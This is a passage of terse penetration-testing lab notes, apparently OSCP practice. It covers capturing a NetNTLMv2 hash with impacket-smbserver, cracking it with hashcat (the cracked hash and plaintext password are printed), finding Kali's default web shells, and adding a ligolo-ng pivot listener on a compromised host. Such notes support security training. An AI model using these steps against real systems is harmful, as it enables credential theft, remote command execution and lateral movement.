Info: Upload successful!

```

### impacket-smbserver
```
sudo impacket-smbserver share share -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
Web側  
<img width="652" alt="image" src="https://github.com/ryuji-jp/htb/assets/61535783/0272f318-b391-4868-a4e6-2c8b8e3631bb">


### NetNTLMv2 hashcrack

```
┌──(rnozaka㉿rnozaka)-[~/Documents/OSCP_A]
└─$  hashcat -m 5600 _wer_svc_hash /usr/share/wordlists/rockyou.txt --force 
```
```
WEB_SVC::OSCP:aaaaaaaaaaaaaaaa:4ffaed86dcac30143bec979f926974eb:010100000000000000a7e435b9bcda01ef4ea1c0ce987cba00000000010010005200690066005200730071004d004800030010005200690066005200730071004d004800020010005a006a00760058006100670045006700040010005a006a007600580061006700450067000700080000a7e435b9bcda0106000400020000000800300030000000000000000000000000300000e78cd6853f7988bc7d4907bcceea4040924ab5d263badcf1e235f21739bc8ceb0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003100390030000000000000000000:Diamond1
```

### web shell
kali デフォルト web shell
```
kali@kali:~$ locate cmdasp
/usr/share/webshells/asp/cmdasp.asp
/usr/share/webshells/aspx/cmdasp.aspx
```
<img width="760" alt="image" src="https://github.com/ryuji-jp/htb/assets/61535783/313de5ce-e4c6-4efc-be6d-b937245276f3">

### Ligolo

https://4pfsec.com/ligolo

```
ligolo-ng » session
? Specify a session : 1 - #1 - OSCP\web_svc@MS01 - 192.168.218.147:56883
[Agent : OSCP\web_svc@MS01] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```
